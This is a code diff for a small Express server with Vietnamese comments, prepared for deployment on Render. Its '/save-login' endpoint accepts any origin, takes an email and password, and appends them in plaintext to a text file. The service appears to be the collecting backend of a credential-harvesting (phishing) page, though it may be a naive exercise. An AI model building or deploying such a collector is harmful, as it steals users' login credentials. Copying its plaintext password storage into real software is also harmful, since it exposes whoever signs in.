@@ -6,17 +6,29 @@ const app = express();
 app.use(express.json());
 app.use(cors());
 
+// Kiểm tra server có hoạt động không
+app.get("/", (req, res) => {
+    res.send("Server đang chạy trên Render!");
+});
+
+// API lưu thông tin đăng nhập
 app.post("/save-login", (req, res) => {
     const { email, password } = req.body;
-    const log = `Email: ${email}, Password: ${password}\n`;
+    if (!email || !password) {
+        return res.status(400).json({ message: "Thiếu email hoặc mật khẩu" });
+    }
 
+    const log = `Email: ${email}, Password: ${password}\n`;
     fs.appendFile("logins.txt", log, (err) => {
         if (err) {
-            res.status(500).json({ message: "Lỗi khi lưu dữ liệu" });
-        } else {
-            res.json({ message: "Dữ liệu đã lưu thành công!" });
+            return res.status(500).json({ message: "Lỗi khi lưu dữ liệu" });
         }
+        res.json({ message: "Dữ liệu đã lưu thành công!" });
     });
 });
 
-app.listen(3000, () => console.log("Server chạy tại http://localhost:3000"));
+// **Lắng nghe trên 0.0.0.0 và dùng PORT của Render**
+const port = process.env.PORT || 10000;
+app.listen(port, "0.0.0.0", () => {
+    console.log(`Server đang chạy trên cổng ${port}`);
+});
